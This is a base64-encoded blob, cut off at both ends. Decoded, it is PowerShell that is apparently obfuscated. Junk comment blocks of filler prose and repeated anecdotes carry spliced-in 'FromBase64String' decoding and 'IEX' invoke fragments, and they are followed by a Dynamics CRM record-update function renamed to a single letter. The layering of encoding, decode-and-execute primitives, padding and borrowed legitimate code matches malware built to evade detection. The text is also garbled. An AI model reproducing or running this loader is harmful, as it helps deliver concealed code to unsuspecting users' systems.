pcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGEoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBlKCkgc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gaCgpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBnKCkgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBiKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIGR7CgoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9IkNybVJlY29yZCIpXQogICAgICAgIFtQU09iamVjdF0kQ3JtUmVjb3JkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJGaWVsZHMiKV0KICAgICAgICBbc3RyaW5nXSRFbnRpdHlMb2dpY2FsTmFtZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MiwgUGFyYW1ldGVyU2V0TmFtZT0iRmllbGRzIildCiAgICAgICAgW2d1aWRdJElkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0zLCBQYXJhbWV0ZXJTZXROYW1lPSJGaWVsZHMiKV0KICAgICAgICBbaGFzaHRhYmxlXSRGaWVsZHMsCgkJW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbc3dpdGNoXSRVcHNlcnQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbQWxsb3dOdWxsKCldCiAgICAgICAgW0FsbG93RW1wdHlTdHJpbmcoKV0KICAgICAgICBbc3RyaW5nXSRQcmltYXJ5S2V5RmllbGQKICAgICkKCgkkY29ubiA9IFZlcmlmeUNybUNvbm5lY3Rpb25QYXJhbSAtY29ubiAkY29ubiAtcGlwZWxpbmVWYWx1ZSAoJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdjb25uJykpCiAgICAKICAgIGlmKCRDcm1SZWNvcmQgLW5lICRudWxsKQogICAgeyAKICAgICAgICAkZW50aXR5TG9naWNhbE5hbWUgPSAkQ3JtUmVjb3JkLmxvZ2ljYWxuYW1lCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGVudGl0eUxvZ2ljYWxOYW1lID0gJEVudGl0eUxvZ2ljYWxOYW1lCiAgICB9CiAgICAKICAgICMgJ1ByaW1hcnlLZXlGaWVsZCcgaXMgYW4gb3B0aW9ucyBwYXJhbWV0ZXIgYW5kIGlzIHVzZWQgZm9yIGN1c3RvbSBhY3Rpdml0eSBlbnRpdGllcwogICAgaWYoLW5vdCBbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkUHJpbWFyeUtleUZpZWxkKSkgCiAgICB7CiAgICAgICAgICRwcmltYXJ5S2V5RmllbGQgPSAkUHJpbWFyeUtleUZpZWxkCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJHByaW1hcnlLZXlGaWVsZCA9IEd1ZXNzUHJpbWFyeUtleUZpZWxkIC1FbnRpdHlMb2dpY2FsTmFtZSAkZW50aXR5TG9naWNhbE5hbWUKICAgIH0KCiAgICAjIElmIHVwc2VydCBzcGVjaWZpZWQKICAgIGlmKCRVcHNlcnQpCiAgICB7CiAgICAgICAgJHJldHJpZXZlRmllbGRzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ10KICAgICAgICBpZigkQ3JtUmVjb3JkIC1uZSAkbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgICMgd2hlbiBDcm1SZWNvcmQgcGFzc2VkLCBhc3N1bWUgdGhpcyBjb21lcyBmcm9tIG90aGVyIHN5c3RlbS4KICAgICAgICAgICAgJGlkID0gJENybVJlY29yZC4kcHJpbWFyeUtleUZpZWxkCiAgICAgICAgICAgIGZvcmVhY2goJGNybUZpZWxkS2V5IGluICgkQ3JtUmVjb3JkIHwgR2V0LU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkpLk5hbWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZEtleS5FbmRzV2l0aCgiX1Byb3BlcnR5IikpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHJldHJpZXZlRmllbGRzLkFkZCgoJENybVJlY29yZC4kY3JtRmllbGRLZXkpLktleSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigoJGNybUZpZWxkS2V5IC1lcSAib3JpZ2luYWwiKSAtb3IgKCRjcm1GaWVsZEtleSAtZXEgImxvZ2ljYWxuYW1lIikgLW9yICgkY3JtRmllbGRLZXkgLWVxICJFbnRpdHlSZWZlcmVuY2UiKWAKICAgICAgICAgICAgICAgICAgLW9yICgkY3JtRmllbGRLZXkgLWxpa2UgIlJldHVyblByb3BlcnR5XyoiKSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICMgdG8gaGF2ZSBvcmlnaW5hbCB2YWx1ZSwgcmF0aGVyIHRoYW4gZm9ybWF0dGVkIHZhbHVlLCByZXBsYWNlIHRoZSB2YWx1ZSBmcm9tIG9yaWdpbmFsIHJlY29yZC4KICAgICAgICAgICAgICAgICAgICAkQ3JtUmVjb3JkLiRjcm1GaWVsZEtleSA9ICRDcm1SZWNvcmQub3JpZ2luYWxbJGNybUZpZWxkS2V5KyJfUHJvcGVydHkiXS5WYWx1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9ICAgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGZvcmVhY2goJGNybUZpZWxkS2V5IGluICRGaWVsZHMuS2V5cykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHJldHJpZXZlRmllbGRzLkFkZCgkY3JtRmllbGRLZXkpCiAgICAgICAgICAgIH0gICAgICAgICAgIAogICAgICAgIH0KCiAgICAgICAgJGV4aXN0aW5nUmVjb3JkID0gR2V0LUNybVJlY29yZCAtY29ubiAkY29ubiAtRW50aXR5TG9naWNhbE5hbWUgJGVudGl0eUxvZ2ljYWxOYW1lIC1JZCAkaWQgLUZpZWxkcyAkcmV0cmlldmVGaWVsZHMuVG9BcnJheSgpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCgogICAgICAgIGlmKCRleGlzdGluZ1JlY29yZC5vcmlnaW5hbCAtZXEgJG51bGwpCiAgICAgICAgewogICAgICAgICAgICBpZigkQ3JtUmVjb3JkIC1uZSAkbnVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEZpZWxkcyA9IEB7fQogICAgICAgICAgICAgICAgZm9yZWFjaCgkY3JtRmllbGRLZXkgaW4gKCRDcm1SZWNvcmQgfCBHZXQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSkuTmFtZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBpZigkY3JtRmllbGRLZXkuRW5kc1dpdGgoIl9Qcm9wZXJ0eSIpKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEZpZWxkcy5BZGQoKCRDcm1SZWNvcmQuJGNybUZpZWxkS2V5KS5LZXksICgkQ3JtUmVjb3JkLiRjcm1GaWVsZEtleSkuVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoJEZpZWxkc1skcHJpbWFyeUtleUZpZWxkXSAtZXEgJG51bGwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRGaWVsZHMuQWRkKCRwcmltYXJ5S2V5RmllbGQsICRJZCkKICAgICAgICAgICAgfQogICAgICAgICAgICAjIGlmIG5vIHJlY29yZCBleGlzdHMsIHRoZW4gY3JlYXRlIG5ldwogICAgICAgICAgICAkcmVzdWx0ID0gTmV3LUNybVJlY29yZCAtY29ubiAkY29ubiAtRW50aXR5TG9naWNhbE5hbWUgJGVudGl0eUxvZ2ljYWxOYW1lIC1GaWVsZHMgJEZpZWxkcwoKICAgICAgICAgICAgcmV0dXJuICRyZXN1bHQKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsgICAKICAgICAgICAgICAgaWYoJENybVJlY29yZCAtbmUgJG51bGwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICMgaWYgcmVjb3JkIGV4aXN0cywgdGhlbiBzd2FwIG9yaWdpbmFsIHJlY29yZCBzbyB0aGF0IHdlIGNhbiBjb21wYXJlIHVwZGF0ZWQgZmllbGRzCiAgICAgICAgICAgICAgICAkQ3JtUmVjb3JkLm9yaWdpbmFsID0gJGV4aXN0aW5nUmVjb3JkLm9yaWdpbmFsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgJG5ld2ZpZWxkcyA9IE5ldy1PYmplY3QgJ1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkRpY3Rpb25hcnlbW1N0cmluZ10sIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybURhdGFUeXBlV3JhcHBlcl1dJwogICAgCiAgICBpZigkQ3JtUmVjb3JkIC1uZSAkbnVsbCkKICAgIHsgICAgICAgICAgICAgICAgCiAgICAgICAgJG9yaWdpbmFsUmVjb3JkID0gJENybVJlY29yZC5vcmlnaW5hbCAgICAgICAgCiAgICAgICAgJElkID0gJG9yaWdpbmFsUmVjb3JkWyRwcmltYXJ5S2V5RmllbGRdCiAgICAgICAgCiAgICAgICAgZm9yZWFjaCgkY3JtRmllbGRLZXkgaW4gKCRDcm1SZWNvcmQgfCBHZXQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSkuTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgICRjcm1GaWVsZFZhbHVlID0gJENybVJlY29yZC4oJGNybUZpZWxkS2V5KQogICAgICAgICAgICBpZigoJGNybUZpZWxkS2V5IC1lcSAib3JpZ2luYWwiKSAtb3IgKCRjcm1GaWVsZEtleSAtZXEgImxvZ2ljYWxuYW1lIikgLW9yICgkY3JtRmllbGRLZXkgLWVxICJFbnRpdHlSZWZlcmVuY2UiKWAKICAgICAgICAgICAgICAtb3IgKCRjcm1GaWVsZEtleSAtbGlrZSAiKl9Qcm9wZXJ0eSIpIC1vciAoJGNybUZpZWxkS2V5IC1saWtlICJSZXR1cm5Qcm9wZXJ0eV8qIikpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCRvcmlnaW5hbFJlY29yZFskY3JtRmllbGRLZXkrIl9Qcm9wZXJ0eSJdLlZhbHVlIC1pcyBbYm9vbF0pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZFZhbHVlIC1pcyBbSW50MzJdKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmKCgkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5KyJfUHJvcGVydHkiXS5WYWx1ZSAtYW5kICRjcm1GaWVsZFZhbHVlIC1lcSAxKSAtb3IgYAogICAgICAgICAgICAgICAgICAgICghJG9yaWdpbmFsUmVjb3JkWyRjcm1GaWVsZEtleSsiX1Byb3BlcnR5Il0uVmFsdWUgLWFuZCAkY3JtRmllbGRWYWx1ZSAtZXEgMCkpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZSAKICAgICAgICAgICAgICAgICAgICB9ICAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigkY3JtRmllbGRWYWx1ZSAtaXMgW2Jvb2xdKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZFZhbHVlIC1lcSAkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5KyJfUHJvcGVydHkiXS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRjcm1GaWVsZFZhbHVlIC1lcSAkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5XSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCRvcmlnaW5hbFJlY29yZFskY3JtRmllbGRLZXkrIl9Qcm9wZXJ0eSJdLlZhbHVlIC1pcyBbTWljcm9zb2Z0LlhybS5TZGsuT3B0aW9uU2V0VmFsdWVdKQogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgaWYoJGNybUZpZWxkVmFsdWUgLWlzIFtNaWNyb3NvZnQuWHJtLlNkay5PcHRpb25TZXRWYWx1ZV0pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaWYoJGNybUZpZWxkVmFsdWUuVmFsdWUgLWVxICRvcmlnaW5hbFJlY29yZFskY3JtRmllbGRLZXkrIl9Qcm9wZXJ0eSJdLlZhbHVlLlZhbHVlKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgZWxzZWlmKCRjcm1GaWVsZFZhbHVlIC1pcyBbSW50MzJdKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZFZhbHVlIC1lcSAkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5KyJfUHJvcGVydHkiXS5WYWx1ZS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRjcm1GaWVsZFZhbHVlIC1lcSAkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5XSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9ICAgICAgICAgICAgCiAgICAgICAgICAgIGVsc2VpZigkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5KyJfUHJvcGVydHkiXS5WYWx1ZSAtaXMgW01pY3Jvc29mdC5Ycm0uU2RrLk1vbmV5XSkKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZFZhbHVlIC1pcyBbTWljcm9zb2Z0LlhybS5TZGsuTW9uZXldKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZFZhbHVlLlZhbHVlIC1lcSAkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5KyJfUHJvcGVydHkiXS5WYWx1ZS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRjcm1GaWVsZFZhbHVlIC1pcyBbZGVjaW1hbF0gLW9yICRjcm1GaWVsZFZhbHVlIC1pcyBbSW50MzJdKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmKCRjcm1GaWVsZFZhbHVlIC1lcSAkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5KyJfUHJvcGVydHkiXS5WYWx1ZS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRjcm1GaWVsZFZhbHVlIC1lcSAkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5XSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5KyJfUHJvcGVydHkiXS5WYWx1ZSAtaXMgW01pY3Jvc29mdC5Ycm0uU2RrLkVudGl0eVJlZmVyZW5jZV0pCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICBpZigoJGNybUZpZWxkVmFsdWUgLWlzIFtNaWNyb3NvZnQuWHJtLlNkay5FbnRpdHlSZWZlcmVuY2VdKSAtYW5kICgkY3JtRmllbGRWYWx1ZS5OYW1lIC1lcSAkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5XS5OYW1lKSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRjcm1GaWVsZFZhbHVlIC1lcSAkb3JpZ2luYWxSZWNvcmRbJGNybUZpZWxkS2V5XSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigkY3JtRmllbGRWYWx1ZSAtZXEgJG9yaWdpbmFsUmVjb3JkWyRjcm1GaWVsZEtleV0pCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICBjb250aW51ZSAKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJG5ld2ZpZWxkID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgJ01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRGF0YVR5cGVXcmFwcGVyJwogICAgICAgICAgICAkdmFsdWUgPSBOZXctT2JqZWN0IHBzb2JqZWN0CiAgICAgICAgICAgIAogICAgICAgICAgICAjIFdoZW4gdmFsdWUgc2V0IHRvIG51bGwsIHRoZW4ganVzdCB1c2UgcmF3IHR5cGUgYW5kIHNldCB2YWx1ZSB0byAkbnVsbAogICAgICAgICAgICBpZigkY3JtRmllbGRWYWx1ZSAtZXEgJG51bGwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRuZXdmaWVsZC5UeXBlID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6UmF3CiAgICAgICAgICAgICAgICAkdmFsdWUgPSAkbnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYoJENybVJlY29yZC4oJGNybUZpZWxkS2V5ICsgIl9Qcm9wZXJ0eS